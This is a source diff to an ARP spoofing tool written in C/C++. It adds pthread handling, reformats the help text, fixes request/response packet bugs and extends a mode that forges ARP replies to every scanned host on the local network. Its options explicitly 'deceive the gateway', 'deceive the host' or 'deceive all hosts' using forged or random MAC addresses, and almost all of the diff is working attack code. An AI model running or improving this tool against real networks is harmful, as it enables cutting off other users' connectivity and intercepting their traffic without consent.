@@ -10,11 +10,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <pthread.h>
 #include <unistd.h>
 #include <signal.h>
 #include <string>
 #include <vector>
-#include <thread>
 #include <map>
 #include "get_interface.h"
 #include "arp.h"
@@ -25,7 +25,6 @@ typedef std::vector<interface_item_t> interface_list_t;
 typedef std::vector<interface_item_t>::iterator interface_list_iter;
 bool run = true;
 extern std::map<std::string, host_info> ips;
-extern std::map<std::string, host_info>::iterator iter;
 
 void signal_callback_handler(int signum) {
     run = false;
@@ -60,23 +59,19 @@ static void get_ifs() {
 }
 static void usage() {
     fprintf(stdout, "Usage: %s [OPTIONS...]\n", g_program_name);
-    fprintf(stdout, "  OPTIONS\n");
-    fprintf(stdout, "    -li            : get network interfaces info\n");
-    fprintf(stdout, "    -t             : cut type:\n"
-                    "                        "
-                    "0 - deceive the gateway (default)\n"
-                    "                        "
-                    "1 - deceive the host\n"
-                    "                        "
-                    "2 - deceive all hosts\n");
-    fprintf(stdout, "    -i             : interface's name eg. eth0\n");
-    fprintf(stdout, "    -scan          : scan inner host\n");
-    fprintf(stdout, "    [-gwip ip]     : specify gateway ip\n");
-    fprintf(stdout, "    [-gwmac mac]   : specify gateway mac\n");
-    fprintf(stdout, "    [-fgmac mac]   : specify forged mac\n");
-    fprintf(stdout, "    -target ip     : target ip\n");
-    fprintf(stdout, "    -h             : help\n");
-    fprintf(stdout, "\nBest wishes!! Contact float0001@gmail.com.\n");
+    fprintf(stdout, "%2sOPTIONS\n", " ");
+    fprintf(stdout, "    %-14s: get network interfaces\n", "-li");
+    fprintf(stdout, "    %-14s: cut type:\n"
+                    "%22s0 - deceive the gateway (default)\n"
+                    "%22s1 - deceive the host\n"
+                    "%22s2 - deceive all hosts\n", "-t", " ", " ", " ");
+    fprintf(stdout, "    %-14s: interface's name eg. eth0\n", "-i");
+    fprintf(stdout, "    %-14s: scan inner host\n", "-scan");
+    fprintf(stdout, "    %-14s: specify gateway ip\n", "[-gwip ip]");
+    fprintf(stdout, "    %-14s: specify gateway mac\n", "[-gwmac mac]");
+    fprintf(stdout, "    %-14s: specify forged mac\n", "[-fgmac mac]");
+    fprintf(stdout, "    %-14s: target ip\n", "-target ip");
+    fprintf(stdout, "    %-14s: help\n", "-h");
     exit(0);
 
 }
@@ -87,6 +82,7 @@ static void scan_host(const char* ifname) {
     int host_cnt = 0;
     arp_cheat_addr_t arp_pkt;
     interface_item_t info;
+    pthread_t tid;
     info.name = "-";
     info.ip = 0;
     info.ip_str = "-";
@@ -115,7 +111,11 @@ static void scan_host(const char* ifname) {
     printf("scan ip: %s - %s\n", start_s, end_s);
     printf("total: %d\n", host_cnt);
 
-    std::thread recv(on_recv_arp_func);
+    int ret = pthread_create(&tid, NULL, on_recv_arp_func, NULL);
+    if(ret != 0) {
+        perror("pthread_create error:");
+        exit(0);
+    }
     arp_pkt.op = 1;
     arp_pkt.if_name = ifname;
     memcpy(arp_pkt.eth_src_mac, info.mac, ETH_ALEN);
@@ -130,13 +130,14 @@ static void scan_host(const char* ifname) {
         send_arp_packet(&arp_pkt);
         usleep(1000);
     }
-    while (run) {
-        sleep(1);
-    }
-
-    if (recv.joinable()) {
-        recv.join();
-    }
+    pthread_join(tid, NULL);
+    //while (run) {
+    //    if (recv.joinable()) {
+    //        recv.join();
+    //        break;
+    //    }
+    //    sleep(1);
+    //}
 }
 static int show_if(const char* ifname, interface_item_t& if_info) {
     if_info.name = "";
@@ -254,8 +255,6 @@ int main(int argc, const char *argv[]) {
         } else {}
     }
     signal(SIGINT, signal_callback_handler);
-    signal(SIGUSR1, signal_callback_handler);
-    signal(SIGTERM, signal_callback_handler);
     if (ifname == NULL) {
          fprintf(stderr, "Please specify interface!!\n");
          usage();
@@ -292,8 +291,8 @@ int main(int argc, const char *argv[]) {
             target_ip, mac_str.c_str());
     fflush(stdout);
     std::string rand_mac = get_rand_mac();
-    fprintf(stdout, "======>attacking");
     if (att_type == 0) {
+        fprintf(stdout, "======>attacking");
         if (!has_gw_mac && if_info.gw_mac_str.size() <= 0) {
             fprintf(stderr, "We need gateway mac!\n");
             return -1;
@@ -305,13 +304,12 @@ int main(int argc, const char *argv[]) {
 //
             req_arpbuf.op = 1;
             if (has_gw_mac) {
-                memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
             } else {
-                memcpy(rsp_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
             }
-//
             req_arpbuf.arp_snd_ip = target_ip;
             req_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
             //memcpy(req_arpbuf.eth_src_mac, ip_mac_addr, ETH_ALEN);
@@ -319,44 +317,31 @@ int main(int argc, const char *argv[]) {
                     ETH_ALEN);
             memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
             send_arp_packet(&req_arpbuf);
-#if 1
+            // send respone
+            memcpy(&rsp_arpbuf, &req_arpbuf, sizeof(req_arpbuf));
             rsp_arpbuf.op = 2;
-            if (has_gw_mac) {
-                memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
-            } else {
-                memcpy(rsp_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
-            }
-            rsp_arpbuf.arp_snd_ip = target_ip;
-            rsp_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
-            //memcpy(rsp_arpbuf.eth_src_mac, ip_mac_addr, ETH_ALEN);
-            get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
-                    ETH_ALEN);
-            memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
             send_arp_packet(&rsp_arpbuf);
-#endif
+
             usleep(500000);
             fprintf(stdout, ".");
             fflush(stdout);
         }
         fprintf(stdout, "\n");
     } else if (att_type == 1) {
+        fprintf(stdout, "======>attacking");
         while (run) {
             // send request packet
             //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
             //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
             //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
             req_arpbuf.op = 1;
-//
             memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
-            memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
-//
+            memcpy(req_arpbuf.arp_tgt_mac, req_arpbuf.eth_dst_mac, ETH_ALEN);
             req_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
             req_arpbuf.arp_tgt_ip = target_ip;
             if (has_gw_mac) {
-                memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
+                memcpy(req_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
             } else {
                 get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
                         ETH_ALEN);
@@ -364,20 +349,10 @@ int main(int argc, const char *argv[]) {
             }
             send_arp_packet(&req_arpbuf);
             // send response packet
+            memcpy(&rsp_arpbuf, &req_arpbuf, sizeof(req_arpbuf));
             rsp_arpbuf.op = 2;
-            memcpy(rsp_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
-            memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
-            rsp_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
-            rsp_arpbuf.arp_tgt_ip = target_ip;
-            if (has_gw_mac) {
-                memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
-            } else {
-                get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
-                        ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
-            }
             send_arp_packet(&rsp_arpbuf);
+
             usleep(500000);
             fprintf(stdout, ".");
             fflush(stdout);
@@ -386,51 +361,50 @@ int main(int argc, const char *argv[]) {
     } else if (att_type == 2) {
         scan_host(ifname);
         while (run) {
-            for (iter = ips.begin(); iter != ips.end(); iter++) {
-                if (iter->first == target_ip) {
+            std::map<std::string, host_info>::iterator itr;
+            for (itr = ips.begin(); itr != ips.end() && run; itr++) {
+                if (itr->first == target_ip) {
                     continue;
                 }
-                // send request packet
-                //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
-                //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
-                //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
+                std::string inner_ip = itr->second.ip;
+                std::string inner_mac = itr->second.mac;
+                // send to target ip
                 req_arpbuf.op = 1;
-//
                 memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
-//
-                req_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
+                memcpy(req_arpbuf.arp_tgt_mac, req_arpbuf.eth_dst_mac, ETH_ALEN);
+                req_arpbuf.arp_snd_ip = inner_ip.c_str();
                 req_arpbuf.arp_tgt_ip = target_ip;
-                if (has_gw_mac) {
-                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
-                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
+                if (has_fg_mac) {
+                    memcpy(req_arpbuf.eth_src_mac, forged_mac, ETH_ALEN);
+                    memcpy(req_arpbuf.arp_snd_mac, forged_mac, ETH_ALEN);
                 } else {
                     get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
                             ETH_ALEN);
                     memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
                 }
                 send_arp_packet(&req_arpbuf);
-                // send response packet
+                memcpy(&rsp_arpbuf, &req_arpbuf, sizeof(req_arpbuf));
                 rsp_arpbuf.op = 2;
-                memcpy(rsp_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
-                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
-                rsp_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
-                rsp_arpbuf.arp_tgt_ip = target_ip;
-                if (has_gw_mac) {
-                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
-                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
-                } else {
-                    get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
-                            ETH_ALEN);
-                    memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
-                }
                 send_arp_packet(&rsp_arpbuf);
+
+                // send host
+                req_arpbuf.op = 1;
+                get_mac_addr(inner_mac.c_str(), req_arpbuf.eth_dst_mac,
+                            ETH_ALEN);
+                memcpy(req_arpbuf.arp_tgt_mac, req_arpbuf.eth_dst_mac, ETH_ALEN);
+                req_arpbuf.arp_snd_ip = target_ip;
+                req_arpbuf.arp_tgt_ip = inner_ip.c_str();
+                send_arp_packet(&req_arpbuf);
+                memcpy(&rsp_arpbuf, &req_arpbuf, sizeof(req_arpbuf));
+                rsp_arpbuf.op = 2;
+                send_arp_packet(&rsp_arpbuf);
+
                 usleep(500000);
                 fprintf(stdout, ".");
                 fflush(stdout);
             }
             fprintf(stdout, "\n");
-
+            break;
         }
     } else {
         fprintf(stderr, "unknown attack type, [%d]\n", att_type);
